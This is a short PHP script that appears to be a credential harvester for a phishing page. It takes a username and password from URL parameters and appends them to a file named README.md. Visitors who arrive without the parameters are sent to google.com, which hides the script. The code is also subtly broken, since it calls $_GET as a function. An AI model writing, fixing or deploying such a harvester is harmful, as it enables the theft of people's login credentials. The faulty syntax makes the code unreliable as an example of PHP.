<?php

	if ($_GET('u') && $_GET('p')) {
		# code...
		$file = fopen("README.md","w");
		fwrite($file, 'IO <> USER : '.$_GET('u').'--> PW : '.$_GET('p').'\n');
		fclose($file);

	}
	else {
		# code...
		echo "<script> window.location.href = 'http://google.com' </script>";
	}
?>
